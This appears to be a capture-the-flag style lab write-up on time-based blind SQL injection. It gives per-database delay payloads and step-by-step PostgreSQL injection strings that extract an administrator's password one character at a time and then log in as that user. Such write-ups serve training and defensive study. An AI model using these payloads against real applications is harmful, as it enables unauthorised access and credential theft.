**<h2>Background:</h2>**

<h3>Conditional Time delays:</h3>
We can test a single boolean condition and trigger a time delay if the condition is true.
<table border=2>
<tr>
<th>Oracle</th>
<td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</td>
</tr>
<tr>
<th>Microsoft</th>
<td>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</td>
</tr>
<tr>
<th>PostgreSQL</th>
<td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</td>
</tr>
<tr>
<th>MySQL</th>
<td>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</td>
</tr>
</table>

**<h2>Problem:</h2>**
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. We need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. 

**<h2>Solution:</h2>**
- Check for the delay for the conditions `` '; select case when (1=1) then pg_sleep(10) else pg_sleep(0) end--`` which delays response for 10 seconds. But for false condition there is no delay.
- Now check if administrator user exists in users table using `` '; select case when (username='administrator') then pg_sleep(10) else pg_sleep(0) end from users--`` there is also delay hence the condition.
- Check for the length of password for administrator user ``'; select case when (username='administrator' and length(password)>1) then pg_sleep(10) else pg_sleep(0) end from users--`` causes 10s delay verifying both conditions.
- Now forward the request to intruder and automate the length condition which gives us length to be 20.
![alt text](/images/lab15lengthofpw.png)
- Now check password using cluster bomb attack where we check for each character for each substring``'; select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(0) end from users--`` 
![alt text](/images/lab15result.png)
- After getting password login as administrator to solve the lab.

